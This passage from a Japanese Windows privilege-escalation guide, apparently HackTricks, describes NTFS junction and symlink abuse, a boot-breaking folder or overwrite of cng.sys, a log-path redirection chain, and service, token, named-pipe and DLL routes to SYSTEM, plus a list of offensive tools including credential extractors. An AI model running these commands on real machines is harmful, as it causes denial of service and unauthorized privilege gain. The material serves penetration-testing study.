> これはフォルダーのメタデータを保存する NTFS 内部ストリームを対象としています。これを削除すると、フォルダー自体が削除されます。

5. Step 5: oplock を解放する
- SYSTEM process は処理を続行し、`file1.txt` の削除を試みます。
- しかし、junction + symlink により、実際に削除されるのは次のものです：
```
C:\Config.Msi::$INDEX_ALLOCATION
```
**結果**: `C:\Config.Msi` は SYSTEM によって削除されます。

### 任意のフォルダー作成から永続的な DoS へ

**ファイルを書き込めない**、または**弱い権限を設定できない**場合でも、**SYSTEM/admin として任意のフォルダーを作成できる** primitive を悪用します。

**重要な Windows driver** の名前を使用して、ファイルではなく**フォルダー**を作成します。例:
```
C:\Windows\System32\cng.sys
```
- このパスは通常、`cng.sys` kernel-mode driver に対応します。
- **フォルダーとして事前に作成**しておくと、Windows は起動時に実際の driver を読み込めなくなります。
- その後、Windows は起動時に `cng.sys` の読み込みを試みます。
- フォルダーを検出し、**実際の driver の解決に失敗**して、**クラッシュするか起動を停止**します。
- **フォールバックはなく**、外部からの介入（boot repair や disk access など）なしに**復旧する方法もありません**。

### 特権 log/backup パス + OM symlinks による任意ファイル上書き / boot DoS

**privileged service** が**書き込み可能な config** から読み取ったパスに logs/exports を書き込む場合、**Object Manager symlinks + NTFS mount points** を使用してそのパスをリダイレクトし、**SeCreateSymbolicLinkPrivilege がなくても** privileged write を任意ファイルの上書きに変えることができます。<sup>[[15]](#references)</sup>

**要件**
- target path を保存する Config が attacker によって書き込み可能であること（例：`%ProgramData%\...\.ini`）。
- `\RPC Control` への mount point と OM file symlink を作成できること（James Forshaw [symboliclink-testing-tools](https://github.com/googleprojectzero/symboliclink-testing-tools)）。<sup>[[16]](#references)[[17]](#references)</sup>
- そのパスに書き込む privileged operation（log、export、report）。

**Example chain**
1. config を読み取り、privileged log destination を特定します。例：`C:\ProgramData\ICONICS\IcoSetup64.ini` 内の `SMSLogFile=C:\users\iconics_user\AppData\Local\Temp\logs\log.txt`。
2. admin なしでパスをリダイレクトします：
```cmd
mkdir C:\users\iconics_user\AppData\Local\Temp\logs
CreateMountPoint C:\users\iconics_user\AppData\Local\Temp\logs \RPC Control
CreateSymlink "\\RPC Control\\log.txt" "\\??\\C:\\Windows\\System32\\cng.sys"
```
3. 特権コンポーネントがログを書き込むまで待ちます（例: admin が「send test SMS」をトリガーする）。これにより、書き込み先が `C:\Windows\System32\cng.sys` になります。
4. 上書きされたターゲットを（hex/PE parser で）調査して破損を確認します。再起動すると、Windows は改ざんされた driver path を読み込むため、**boot loop DoS** が発生します。これは、特権 service が書き込み用に開く保護対象ファイル全般にも適用できます。

> `cng.sys` は通常 `C:\Windows\System32\drivers\cng.sys` から読み込まれますが、`C:\Windows\System32\cng.sys` にコピーが存在する場合は、そちらが先に試行される可能性があるため、破損データの信頼性の高い DoS sink になります。



## **High Integrity から System へ**

### **新しい service**

すでに High Integrity process 上で実行している場合、**新しい service を作成して実行する**だけで、**SYSTEM への path** は容易になります。
```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```
> [!TIP]
> サービス binary を作成する際は、それが有効なサービスであること、または binary が必要なアクションを高速に実行することを確認してください。有効なサービスでない場合、20秒後に kill されます。

### AlwaysInstallElevated

High Integrity process から、**AlwaysInstallElevated registry entries を enable** し、_**.msi**_ wrapper を使用して reverse shell を **install** できます。\
[関連する registry keys と _.msi_ package の install 方法についての詳細はこちら。](#alwaysinstallelevated)

### High + SeImpersonate privilege to System

**コードは** [**こちらにあります**](seimpersonate-from-high-to-system.md)**。**

### From SeDebug + SeImpersonate to Full Token privileges

これらの token privileges を持っている場合（おそらく、すでに High Integrity process 内にあるときに確認できます）、SeDebug privilege を使用して、（protected processes 以外の）**ほぼすべての process を open** し、その process の **token を copy** して、**その token を使用した任意の process を create** できます。\
通常この technique では、**すべての token privileges を持つ SYSTEM として実行されている process を選択** します（_すべての token privileges を持たない SYSTEM processes も存在します_）。\
**提案した technique を実行するコード例は** [**こちらにあります**](sedebug-+-seimpersonate-copy-token.md)**。**

### **Named Pipes**

この technique は meterpreter が `getsystem` で privilege escalation を行うために使用します。この technique では、**pipe を create した後、その pipe に write するための service を create/abuse** します。その後、**`SeImpersonate`** privilege を使用して pipe を create した **server** は、pipe client（service）の **token を impersonate** し、SYSTEM privileges を取得できます。\
name pipes について [**さらに学びたい場合はこちらを読んでください**](#named-pipe-client-impersonation)。\
name pipes を使用して [**high integrity から System に移行する方法の例はこちらを読んでください**](from-high-integrity-to-system-with-name-pipes.md)。

### Dll Hijacking

**SYSTEM** として実行されている **process** によって **load** される **dll を hijack** できれば、その permissions で arbitrary code を execute できます。そのため Dll Hijacking はこの種の privilege escalation にも有用です。さらに、dll の load に使用される folders に **write permissions** があるため、**high integrity process から実行する方がはるかに容易** です。\
**Dll hijacking の詳細は** [**こちらを参照してください**](dll-hijacking/index.html)**。**

### **From Administrator or Network Service to System**

- [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
- [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
- [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)

### From LOCAL SERVICE or NETWORK SERVICE to full privs

**Read:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## More help

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Useful tools

**Windows local privilege escalation vectors を探すための Best tool:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- misconfigurations と sensitive files を Check（**[**こちらを確認**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**）。Detected.**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- いくつかの可能な misconfigurations を Check し、info を gather（**[**こちらを確認**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**）。**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- misconfigurations を Check**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- PuTTY、WinSCP、SuperPuTTY、FileZilla、RDP の saved session information を extract します。local では -Thorough を使用します。**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Credential Manager から credentials を Extract します。Detected.**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- gather した passwords を domain 全体に Spray**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh は PowerShell ADIDNS/LLMNR/mDNS spoofer 兼 man-in-the-middle tool です。**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- Basic privesc Windows enumeration**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **~~**~~ -- 既知の privesc vulnerabilities を Search（Watson では DEPRECATED）\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- Local checks **(Need Admin rights)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- 既知の privesc vulnerabilities を Search（VisualStudio を使用して compile する必要があります）([**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- misconfigurations を Search しながら host を Enumerate します（privesc tool というより info gather tool に近い）（compile が必要）**(**[**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- 多数の software から credentials を Extract（github に precompiled exe あり）**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- PowerUp の C# への Port**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **~~**~~ -- misconfiguration を Check（github に executable precompiled あり）。Not recommended。Win10 では正常に動作しません。\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- 可能な misconfigurations を Check（python からの exe）。Not recommended。Win10 では正常に動作しません。

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- この post に基づいて作成された Tool（正常に動作させるために accesschk への access は不要ですが、使用できます）。

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- **systeminfo** の output を Read し、動作する exploits を Recommend（local python）\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- **systeminfo** の output を Read し、動作する exploits を Recommend（local Python）

**Meterpreter**

_multi/recon/local_exploit_suggestor_

正しい version の .NET を使用して project を compile する必要があります（[こちらを参照](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)）。victim host に install されている .NET の version を確認するには、次を実行します。
```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```
## References

- [1] [Windows Privilege Escalationの基礎](http://www.fuzzysecurity.com/tutorials/16.html)
- [2] [脆弱なフォルダー権限を悪用した権限昇格](http://www.greyhathacker.net/?p=738)
- [3] [Windows Privilege Escalation - チートシート](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [4] [lpeworkshop - Windows / Linux Local Privilege Escalation Workshop](https://github.com/sagishahar/lpeworkshop)
- [5] [DerbyCon 3.0 - Windows Attacks: AT is the new black (Rob Fuller & Chris Gates)](https://www.youtube.com/watch?v=_8xJaaQlpBo)
- [6] [Privilege Escalation - Windows - Total OSCP Guide](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
- [7] [Windows - Privilege Escalation - PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [8] [Windows Privilege Escalation Guide](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [9] [Windows-Privilege-Escalation チェックリスト](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
- [10] [Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [11] [Pentester向けWindows Privilege Escalation手法](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
- [12] [0xdf – HTB/VulnLab JobTwo: SMTP経由のWord VBA macro phishing → hMailServer credential復号 → Veeam CVE-2023-27532によるSYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [13] [HTB Reaper: Format-string leak + stack BOF → VirtualAlloc ROP (RCE)およびkernel token窃取](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)
- [14] [Check Point Research – Silver Foxを追う: Kernel ShadowsにおけるCat & Mouse](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)
- [15] [Unit 42 – SCADA Systemに存在するPrivileged File System Vulnerability](https://unit42.paloaltonetworks.com/iconics-suite-cve-2025-0921/)
- [16] [Symbolic Link Testing Tools – CreateSymlinkの使用方法](https://github.com/googleprojectzero/symboliclink-testing-tools/blob/main/CreateSymlink/CreateSymlink_readme.txt)
- [17] [過去へのリンク。Windows上でのSymbolic Linksの悪用](https://infocon.org/cons/SyScan/SyScan%202015%20Singapore/SyScan%202015%20Singapore%20presentations/SyScan15%20James%20Forshaw%20-%20A%20Link%20to%20the%20Past.pdf)
- [18] [RIP RegPwn – MDSec](https://www.mdsec.co.uk/2026/03/rip-regpwn/)
- [19] [RegPwn BOF (Cobalt Strike BOF port)](https://github.com/Flangvik/RegPwnBOF)
- [20] [ZDI - Node.js Trust Falls: Windowsにおける危険なModule Resolution](https://www.thezdi.com/blog/2026/4/8/nodejs-trust-falls-dangerous-module-resolution-on-windows)
- [21] [Node.js modules: `node_modules` foldersからの読み込み](https://nodejs.org/api/modules.html#loading-from-node_modules-folders)
- [22] [npm package.json: `optionalDependencies`](https://docs.npmjs.com/cli/v11/configuring-npm/package-json#optionaldependencies)
- [23] [Process Monitor (Procmon)](https://learn.microsoft.com/en-us/sysinternals/downloads/procmon)
- [24] [Trail of Bits - C/C++ checklist challenges、解決済み](https://blog.trailofbits.com/2026/05/05/c/c-checklist-challenges-solved/)
- [25] [Microsoft Learn - RtlQueryRegistryValues function](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-rtlqueryregistryvalues)
- [26] [PowerShell Gallery - NtObjectManager](https://www.powershellgallery.com/packages/NtObjectManager/2.0.1)
- [27] [sec-zone - CVE-2026-36213](https://github.com/sec-zone/CVE-2026-36213)
- [28] [sec-zone - Hijack-service-binaries](https://github.com/sec-zone/Hijack-service-binaries)
- [29] [Pwn2Own with Microslop: Windows LPEのためのCLDFLTとDirectX Kernel Race Conditionsの連鎖](https://dungnm.hashnode.dev/pwn2own-with-microslop)
- [30] [One I/O Ring to Rule Them All: Windows 11における完全なRead/Write Exploit Primitive](https://windows-internals.com/one-i-o-ring-to-rule-them-all-a-full-read-write-exploit-primitive-on-windows-11/)
- [31] [任意のFile Deletesを悪用したPrivilege Escalationとその他の優れた技巧](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks)
- [32] [thezdi/PoC - FilesystemEoPs exploit code](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs)
- [33] [GoSecure – WSUS Attacks Part 2: CVE-2020-1013、Windows 10 Local Privilege Escalation 1-Day](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/)
- [34] [Windows 7: Credential ManagerとWindows Vaultを探る](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)
- [35] [jas502n - CVE-2019-1388 PoC](https://github.com/jas502n/CVE-2019-1388)
- [36] [research.nccgroup.com - Image ChangeがPrivilege Escalationにつながる場合のKerberos Resource Based Constrained Delegation](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation)
- [37] [blog.ropnop.com - Windows 10 Ssh AgentからのSsh Private Keysの抽出](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent)
- [38] [SpecterOps – Enterprise Update ServersをBackdoor Factoriesに変える (0_o) – Part 1](https://specterops.io/blog/2026/08/05/turning-enterprise-update-servers-into-backdoor-factories-part-1/)
- [39] [SpecterOps – Enterprise Update ServersをBackdoor Factoriesに変える (0_o) – Part 2](https://specterops.io/blog/2026/08/05/turning-enterprise-update-servers-into-backdoor-factories-part-2/)
- [40] [bagelByt3s – NotWSUSPicious](https://github.com/bagelByt3s/NotWSUSPicious)
{{#include ../../banners/hacktricks-training.md}}
